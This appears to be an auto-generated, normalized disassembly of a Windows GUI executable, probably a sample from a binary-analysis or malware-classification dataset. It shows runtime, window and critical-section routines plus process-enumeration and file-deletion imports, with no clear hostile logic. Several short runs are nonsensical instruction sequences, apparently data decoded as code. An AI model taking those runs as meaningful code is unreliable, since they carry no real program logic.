je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_417791
sub_417989
mov eax sub_4181e8
call sub_4072e4
push ecx
push ecx
push ebx
push esi
push edi
mov esi ecx
xor edi edi
mov [ ebp - 0x10 ] esp
cmp [ esi ] edi
jne r-xdata
mov eax [ esi ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push 0x10
call sub_417bf3
mov [ ebp - 0x4 ] edi
cmp [ esi ] edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_417c63
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_4179e4
push ebp
mov ebp esp
push ecx
cmp [ ecx ] 0x0
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_417a09
mov eax sub_4181fc
call sub_4072e4
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov eax [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
push 0x0
call eax
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push esi
call [ FreeLibrary@IAT ]
sub_417abb
cmp [ rw-data ] 0x0
je r-xdata
retn
push esi
mov esi [ GetSystemMetrics@IAT ]
push 0x2
call esi
inc eax
push 0x3
mov [ rw-data ] eax
call esi
inc eax
mov [ rw-data ] 0x1
mov [ rw-data ] eax
pop esi
sub_417b0d
push ebx
push esi
push edi
mov esi ecx
call [ GetVersion@IAT ]
xor ecx ecx
push 0x1
mov cl ah
movzx edx al
movzx ecx cl
shl edx 0x8
add ecx edx
mov [ esi + 0x54 ] ecx
mov ecx eax
shr ecx 0x1f
cmp al 0x4
mov [ esi + 0x58 ] ecx
sbb eax eax
pop ecx
inc eax
xor ebx ebx
sub ecx eax
cmp eax ebx
mov [ esi + 0x5c ] eax
mov [ esi + 0x60 ] ecx
mov [ esi + 0x64 ] eax
mov [ esi + 0x68 ] ebx
je r-xdata
mov ecx esi
call sub_4162dc
mov ecx esi
mov [ esi + 0x24 ] ebx
call sub_416298
mov edi [ LoadCursorA@IAT ]
push 0x7f02
push ebx
call edi
push 0x7f00
push ebx
mov [ esi + 0x3c ] eax
call edi
mov [ esi + 0x40 ] eax
xor eax eax
cmp [ esi + 0x5c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x44 ] ebx
pop edi
setne al
inc eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebx
retn
push ebx
call [ GetProcessVersion@IAT ]
cmp eax 0x40000
sbb eax eax
inc eax
mov [ esi + 0x68 ] eax
sub_417bae
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
push 0x1
pop esi
mov [ rw-data ] esi
call [ GetVersion@IAT ]
cmp al 0x4
jae r-xdata
and [ rw-data ] 0x0
push rw-data
call [ InitializeCriticalSection@IAT ]
test eax 0x80000000
je r-xdata
mov [ rw-data ] esi
jmp r-xdata
sub_417bf3
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
call sub_417bae
pop ebx
retn 0x4
push esi
push edi
mov edi [ esp + 0x10 ]
cmp [ edi * 4 + rw-data ] ebx
mov ebx [ EnterCriticalSection@IAT ]
lea esi [ edi * 4 + rw-data ]
jne r-xdata
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call ebx
pop edi
pop esi
push ebp
mov ebp rw-data
push ebp
call ebx
cmp [ esi ] 0x0
jne r-xdata
push ebp
call [ LeaveCriticalSection@IAT ]
pop ebp
lea eax [ edi + edi * 2 ]
lea eax [ eax * 8 + rw-data ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi ]
sub_417cc9
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
call [ GetOEMCP@IAT ]
push eax
call [ GetCPInfo@IAT ]
push 0x1
pop eax
cmp eax [ ebp - 0x14 ]
sbb eax eax
neg eax
leave
retn
sub_417e74
push esi
mov ecx rw-data
call sub_405dc9
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop esi
retn
mov ecx esi
call sub_41667e
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_417fba
mov eax sub_418284
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x4
push ecx
call sub_4165dd
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_401c85
jmp r-xdata
jmp sub_401cd3
sub_401c91
0x5178
sub_401cd3
pop edi
pop esi
pop ebx
leave
retn
sub_402681
xor [ ebx - 0xc600119 ] cl
in al 0xee
movsb [ edi ] [ esi ]
jmp r-xdata
sub_40268c
dec eax
iretd
sub_4026a2
pop ebp
inc ebp
mov ebp es

sub_402bc3
iretd
sub_402d04
stosb [ edi ]
lea eax [ di - 0x648 ]
j_sub_402d04
jmp sub_402d04
sub_403007
lea ebp [ eax ]
shl [ edi ] cl
dec eax
mov ecx 0x36274601
add [ esi ] dl
pop ebp
hlt
sub_403439
add bh [ ss : esi ]
fisubr [ eax + 0x3937c76e ]
insd
push edx
mov esi 0x3b4cbf60
aas
xchg eax esp
xlat
clc
and ah 0x7
or dl [ eax + ecx ]
hlt
sub_40400c
outsb
dec esp
test al 0xe9
retn
sub_404a5f
iretd
sub_4056e3
jmp r-xdata
nop
nop [ eax ] eax
jmp sub_405841
sub_405801
fstp [ cs : ecx ]
inc ecx
std
0x91207b42 0x2392
neg [ ebx - 0x30 ]
xchg [ ebx ] esi
0xfab1
sub_405841
pop edi
pop esi
pop ebx
leave
retn
sub_405d0c
retn
sub_405d0d
retn 0x4
sub_405d10
push esi
mov esi ecx
call sub_405d2c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_405d2c
mov eax sub_418028
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
add ecx 0x10
call sub_412e25
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_405d58
push [ esp + 0x4 ]
call sub_41349d
pop ecx
retn 0x4
sub_405d8d
push esi
mov esi ecx
call sub_405da1
add esi 0x10
push esi
call [ DeleteCriticalSection@IAT ]
pop esi
retn
sub_405e84
call sub_413553
test eax eax
je r-xdata
xor eax eax
retn
mov edx [ eax ]
mov ecx eax
call [ edx + 0x74 ]
retn
sub_405e98
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4135b8
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_405ec2
push esi
mov esi ecx
call sub_405ede
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_405ede
mov [ ecx ] r--data
retn
sub_405ee5
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4135b8
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_405f0f
push esi
mov esi ecx
call sub_405f2b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_405f2b
mov [ ecx ] r--data
retn
sub_40615e
mov eax [ ecx + 0x20 ]
test eax eax
jne r-xdata
push eax
call sub_413f56
retn
push [ ecx + 0x1c ]
call [ GetParent@IAT ]
sub_406175
push 0x0
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_406181
push 0x1
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
retn
sub_40618d
call sub_41730f
mov ecx [ eax + 0x4 ]
jmp sub_4138a9
sub_40619a
push esi
mov esi ecx
call sub_4061b6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_4061fe
push esi
mov esi ecx
call sub_40621a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_40621a
mov eax sub_4182c0
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_4164b0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_406243
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4135b8
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_40626d
push esi
mov esi ecx
call sub_406289
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_406289
mov [ ecx ] r--data
retn
sub_406290
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_4135b8
mov eax [ esp + 0xc ]
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
mov [ esi + 0x94 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x8
sub_4062ba
push esi
mov esi ecx
call sub_4062d6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_4062d6
mov [ ecx ] r--data
retn
sub_4062dd
push esi
mov esi ecx
call sub_4062f9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_4062f9
mov eax sub_418324
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_416bd8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_406322
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
retn 0x8
sub_406336
push [ esp + 0x4 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
retn 0x4
sub_406346
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ TextOutA@IAT ]
retn 0x10
sub_4063bf
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ DrawTextA@IAT ]
retn 0x10
sub_40640b
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
retn 0x10
sub_4065d8
call sub_4090c1
mov ecx [ esp + 0x4 ]
mov [ eax + 0x14 ] ecx
retn
sub_4065e5
call sub_4090c1
mov ecx [ eax + 0x14 ]
imul ecx ecx 0x343fd
add ecx 0x269ec3
mov [ eax + 0x14 ] ecx
mov eax ecx
shr eax 0x10
and eax 0x7fff
retn
sub_406ee7
cmp [ rw-data ] 0x1
jne r-xdata
push [ esp + 0x4 ]
call sub_40b521
pop ecx
push 0xff
call [ ExitProcess@IAT ]
call sub_40b4e8
sub_406f3f
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_406f46
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40716e
push 0x1
pop eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_407214
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40729e
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_407214
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4072ca
push ebx
push ecx
mov ebx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
pop ecx
pop ebx
retn 0x4
sub_4072e4
push 0xffffffff
push eax
mov eax [ fs : 0x0 ]
push eax
mov eax [ esp + 0xc ]
mov [ fs : 0x0 ] esp
mov [ esp + 0xc ] ebp
lea ebp [ esp + 0xc ]
push eax
retn
sub_407381
push [ esp + 0x4 ]
call sub_407303
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_407807
push esi
mov esi ecx
call sub_4077de
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_40785f
push 0x1
push [ esp + 0x8 ]
call sub_40786d
pop ecx
pop ecx
retn
sub_408093
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xfffffffd
call sub_407cbb
pop ecx
mov [ rw-data ] 0x1
sub_408618
mov eax [ rw-data ]
test eax eax
je r-xdata
push rw-data
push rw-data
call sub_40871e
push rw-data
push rw-data
call sub_40871e
add esp 0x10
retn
call eax
sub_408645
push 0x0
push 0x0
push [ esp + 0xc ]
call sub_408667
add esp 0xc
retn
sub_408656
push 0x0
push 0x1
push [ esp + 0xc ]
call sub_408667
add esp 0xc
retn
sub_40870c
push 0xd
call sub_409fbd
pop ecx
retn
sub_408715
push 0xd
call sub_40a01e
pop ecx
retn
sub_40902f
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov eax [ eax - 0x4 ]
retn
sub_40903c
mov eax [ esp + 0x4 ]
add [ eax ] 0x8
mov ecx [ eax ]
mov eax [ ecx - 0x8 ]
mov edx [ ecx - 0x4 ]
retn
sub_40904c
mov eax [ esp + 0x4 ]
add [ eax ] 0x4
mov eax [ eax ]
mov ax [ eax - 0x4 ]
retn
sub_4090ae
mov eax [ esp + 0x4 ]
mov [ eax + 0x50 ] rw-data
mov [ eax + 0x14 ] 0x1
retn
sub_409292
call sub_40950e
cmp [ rw-data ] 0x0
je r-xdata
retn
jmp sub_40cfc5
sub_40950e
push 0x1
call sub_409517
pop ecx
retn
sub_409f94
push esi
mov esi [ InitializeCriticalSection@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
retn
sub_40b4cd
push ebp
mov ecx [ esp + 0x8 ]
mov ebp [ ecx ]
mov eax [ ecx + 0x1c ]
push eax
mov eax [ ecx + 0x18 ]
push eax
call sub_407236
add esp 0x8
pop ebp
retn 0x4
sub_40ba30
push [ ebp - 0x14 ]
call sub_40ba67
pop ecx
retn
sub_40ba67
mov eax [ esp + 0x4 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
je r-xdata
jmp sub_40bedc
xor eax eax
retn
sub_40bb9d
push [ ebp - 0x14 ]
call sub_40bc13
pop ecx
retn
sub_40bdf5
push 0x1
pop eax
retn
sub_40bdf9
mov esp [ ebp - 0x18 ]
jmp sub_40bedc
sub_40be57
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40be60
mov esp [ ebp - 0x18 ]
jmp sub_40bedc
sub_40bf24
push 0x1
pop eax
retn
sub_40bf7a
push 0x1
pop eax
retn
sub_40c2ea
push 0x1
pop eax
retn
sub_40c39e
push 0x1
pop eax
retn
sub_40c790
push esi
push 0xb
call sub_409fbd
push [ esp + 0xc ]
call sub_40c7b1
push 0xb
mov esi eax
call sub_40a01e
add esp 0xc
mov eax esi
pop esi
retn
sub_40cb96
push 0x1
pop eax
retn
sub_40cd06
push sub_40ccc0
call [ SetUnhandledExceptionFilter@IAT ]
mov [ rw-data ] eax
retn
sub_40cd17
push [ rw-data ]
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40d305
mov eax [ esp + 0x4 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax * 4 + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
retn
sub_40d689
push 0x4
push 0x0
push [ esp + 0xc ]
call sub_40d69a
add esp 0xc
retn
sub_40d85e
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadReadPtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40d87a
push esi
push 0x1
pop esi
push [ esp + 0xc ]
push [ esp + 0xc ]
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40d896
push esi
push 0x1
pop esi
push [ esp + 0x8 ]
call [ IsBadCodePtr@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
retn
xor esi esi
sub_40da59
push 0x2
call sub_406ec2
pop ecx
retn
sub_40e199
push 0x1
pop eax
retn
sub_40e208
push 0x1
pop eax
retn
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
ClosePrinter
jmp [ ClosePrinter@IAT ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_40e4d0
mov eax [ esp + 0x4 ]
push eax
call [ DeleteFileA@IAT ]
retn
sub_40e5e0
mov eax [ esp + 0x4 ]
push eax
call [ RemoveDirectoryA@IAT ]
retn
sub_40e610
mov eax [ esp + 0x4 ]
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
jne r-xdata
and eax 0xff
shr eax 0x4
and eax 0x1
retn
xor eax eax
retn
sub_40fce0
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
jne r-xdata
push eax
call sub_4106e0
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_40fd00
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
jne r-xdata
push eax
call sub_410780
add esp 0x4
xor eax eax
retn
or eax 0xffffffff
retn
sub_410020
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
retn
sub_410030
mov [ rw-data ] 0x0
retn
sub_4106c0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ esp + 0x8 ]
push eax
call sub_4101f0
pop ecx
sub_410f00
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push eax
push rw-data
push ecx
call sub_410e30
add esp 0xc
retn
sub_410f80
mov eax [ ecx + 0x8 ]
retn
sub_410f90
mov eax [ ecx + 0x8 ]
mov ecx [ esp + 0x4 ]
lea eax [ eax + ecx * 8 + 0x78 ]
retn 0x4
sub_411b6d
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push [ esp + 0x4 ]
call sub_406c50
pop ecx
xor eax eax
retn
or eax 0xffffffff
retn
sub_411cd9
push 0x1
push rw-data
push [ esp + 0xc ]
call sub_411c40
add esp 0xc
push 0x1
pop eax
retn
sub_411cf0
push 0x2
push rw-data
push [ esp + 0xc ]
call sub_411c40
add esp 0xc
push 0x2
pop eax
retn
sub_411d5f
push 0x1
push rw-data
push [ esp + 0xc ]
call sub_411c40
add esp 0xc
push 0x1
pop eax
retn
sub_4122aa
push [ esp + 0x4 ]
call sub_412280
pop ecx
retn
CheckTokenMembership
jmp [ CheckTokenMembership@IAT ]
sub_4125cf
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push r--data
push eax
mov [ ebp - 0x4 ] rw-data
call sub_408134
sub_4125e8
mov eax [ esp + 0x8 ]
imul eax [ esp + 0xc ]
add eax 0x4
push eax
call sub_413474
pop ecx
mov ecx [ esp + 0x4 ]
mov edx [ ecx ]
mov [ eax ] edx
mov [ ecx ] eax
retn 0xc
sub_412608
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_41349d
pop ecx
test esi esi
mov ecx esi
jne r-xdata
pop esi
sub_41263e
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_41261e
sub_4126a2
push esi
mov esi ecx
call sub_41272e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_41272e
mov eax sub_41825c
call sub_4072e4
push ecx
mov [ ebp - 0x10 ] ecx
mov [ ecx ] r--data
and [ ebp - 0x4 ] 0x0
call sub_412703
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_4127a4
mov eax [ esp + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
retn 0x4
call sub_412703
sub_412beb
call sub_412bf5
jmp sub_412c04
sub_412bf5
push 0x40
push 0x50
mov ecx rw-data
call sub_405d65
retn
sub_412c04
push sub_412c10
call sub_407381
pop ecx
retn
sub_412c10
mov ecx rw-data
jmp sub_405d8d
sub_412c1a
call sub_412c24
jmp sub_412c36
sub_412c24
push 0x40
push 0x90
mov ecx rw-data
call sub_405d65
retn
sub_412c36
push sub_412c42
call sub_407381
pop ecx
retn
sub_412c42
mov ecx rw-data
jmp sub_405d8d
sub_412c4c
call sub_412c56
jmp sub_412c68
sub_412c56
push 0x40
push 0x110
mov ecx rw-data
call sub_405d65
retn
sub_412c68
push sub_412c74
call sub_407381
pop ecx
retn
sub_412c74
mov ecx rw-data
jmp sub_405d8d
sub_412c7e
call sub_412c88
jmp sub_412c9a
sub_412c88
push 0x40
push 0x210
mov ecx rw-data
call sub_405d65
retn
sub_412c9a
push sub_412ca6
call sub_407381
pop ecx
retn
sub_412ca6
mov ecx rw-data
jmp sub_405d8d
sub_412dab
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
je r-xdata
pop esi
retn 0x4
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx esi
call sub_412d32
sub_4130b0
cmp [ esp + 0x4 ] 0x0
je r-xdata
retn 0x8
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ esp + 0xc ]
call sub_4131dc
push eax
call sub_413171
sub_41345a
call sub_4125cf
xor eax eax
retn
sub_41349d
push [ esp + 0x4 ]
call sub_406c50
pop ecx
retn
sub_4135a0
mov ecx [ ebp - 0x18 ]
call sub_4135c4
mov eax r-xdata
retn
sub_4135ae
mov eax ecx
mov [ eax + 0x4 ] 0x1
retn
sub_4135b8
mov eax ecx
mov ecx [ esp + 0x4 ]
mov [ eax + 0x4 ] ecx
retn 0x4
sub_4135c4
cmp [ ecx + 0x4 ] 0x0
jle r-xdata
retn
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41362b
mov eax ecx
push 0x1
pop ecx
xor edx edx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x18 ] edx
retn
sub_413886
push 0x1
pop eax
retn 0x4
sub_41388c
mov eax 0x80029c4a
retn 0x8
sub_413894
call sub_41730f
mov eax [ eax + 0x4 ]
push 0x1
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_4138a9
call sub_41730f
mov eax [ eax + 0x4 ]
push 0xffffffff
mov ecx eax
mov edx [ eax ]
call [ edx + 0x90 ]
retn
sub_4138be
mov eax r--data
retn
sub_4138c4
mov eax r--data
retn
sub_4138ca
mov eax r--data
retn
sub_4138d0
push 0x1
pop eax
retn
sub_4138d4
xor eax eax
retn 0x4
sub_4138d9
mov eax r--data
retn
sub_4138df
mov eax r--data
retn
j_sub_413aaf
jmp sub_413aaf
sub_413aaf
push r--data
call [ RegisterWindowMessageA@IAT ]
mov [ rw-data ] eax
retn
sub_413ac0
call sub_413aca
jmp sub_413ad7
sub_413aca
push 0x0
mov ecx rw-data
call sub_413bf6
retn
sub_413ad7
push sub_413ae3
call sub_407381
pop ecx
retn
sub_413ae3
test [ rw-data ] 0x1
jne r-xdata
retn
or [ rw-data ] 0x1
mov ecx rw-data
jmp sub_4145c9
sub_413afe
call sub_413b08
jmp sub_413b15
sub_413b08
push 0x1
mov ecx rw-data
call sub_413bf6
retn
sub_413b15
push sub_413b21
call sub_407381
pop ecx
retn
sub_413b21
test [ rw-data ] 0x2
jne r-xdata
retn
or [ rw-data ] 0x2
mov ecx rw-data
jmp sub_4145c9
sub_413b3c
call sub_413b46
jmp sub_413b53
sub_413b46
push 0xffffffff
mov ecx rw-data
call sub_413bf6
retn
sub_413b53
push sub_413b5f
call sub_407381
pop ecx
retn
sub_413b5f
test [ rw-data ] 0x4
jne r-xdata
retn
or [ rw-data ] 0x4
mov ecx rw-data
jmp sub_4145c9
sub_413b7a
call sub_413b84
jmp sub_413b91
sub_413b84
push 0xfffffffe
mov ecx rw-data
call sub_413bf6
retn
sub_413b91
push sub_413b9d
call sub_407381
pop ecx
retn
sub_413b9d
test [ rw-data ] 0x8
jne r-xdata
retn
or [ rw-data ] 0x8
mov ecx rw-data
jmp sub_4145c9
sub_413bda
push esi
mov esi ecx
call sub_4145c9
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_41349d
pop ecx
sub_413c22
push esi
mov esi [ esp + 0x8 ]
push [ esp + 0xc ]
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov ecx esi
call sub_416175
mov ecx [ esp + 0x10 ]
pop esi
mov [ ecx ] eax
retn 0xc
sub_413f7d
push 0x0
call sub_413ee4
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
retn 0x4
push [ esp + 0x4 ]
add ecx 0x4
call sub_4127ef
sub_414002
retn
sub_41455d
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x28 ] 0x0
jne r-xdata
push 0x1
pop eax
pop esi
retn 0x4
push 0x1
call sub_415d0c
mov [ esi + 0x28 ] r--data
sub_414775
cmp [ ecx + 0x1c ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0xa4 ]
jmp [ eax + 0x58 ]
sub_41481a
lea eax [ ecx + 0x28 ]
retn
sub_41481e
push esi
mov esi ecx
call sub_41730f
mov eax [ eax + 0x1034 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn 0x4
push esi
push [ esp + 0xc ]
call eax
sub_41496c
mov eax [ esp + 0x8 ]
push esi
push 0x0
mov esi ecx
push [ eax + 0xc ]
call sub_415545
test eax eax
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_413ebd
sub_414c5b
mov eax r--data
retn
sub_415257
push esi
mov esi ecx
call sub_4138e5
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_415270
mov eax [ esp + 0x4 ]
mov [ ecx + 0x18 ] 0x1
mov [ ecx + 0x28 ] eax
retn 0x4
sub_415281
retn 0x4
sub_415759
cmp [ esp + 0x4 ] 0x0
jne r-xdata
xor eax eax
retn 0x8
call sub_4170dd
test [ eax + 0xdf ] 0x40
jne r-xdata
push 0x1
call sub_41483d
sub_415c29
mov eax [ ecx + 0x24 ]
and eax 0x10
retn
sub_415fc3
xor eax eax
retn
sub_415fc6
push [ esp + 0x4 ]
mov ecx rw-data
call sub_405e58
retn
sub_41615e
push [ esp + 0xc ]
mov ecx [ ecx + 0x34 ]
push [ esp + 0xc ]
mov eax [ ecx ]
push [ esp + 0xc ]
call [ eax + 0x54 ]
retn 0xc
sub_416175
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x70 ]
push 0xfffffff0
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_41618f
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0x74 ]
push 0xffffffec
push [ ecx + 0x1c ]
call [ GetWindowLongA@IAT ]
retn
sub_4161f8
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xa4 ]
push [ ecx + 0x1c ]
call [ IsWindowEnabled@IAT ]
retn
sub_416213
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0xa8 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ EnableWindow@IAT ]
jmp r-xdata
retn 0x4
sub_41623a
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
jmp [ edx + 0xac ]
push [ ecx + 0x1c ]
call [ SetFocus@IAT ]
push eax
call sub_413f56
retn
sub_416453
push 0x1
call sub_4163e1
mov ecx eax
push [ esp + 0x4 ]
call sub_41603a
retn 0x4
sub_416468
push 0x0
call sub_4163e1
mov ecx eax
xor eax eax
test ecx ecx
je r-xdata
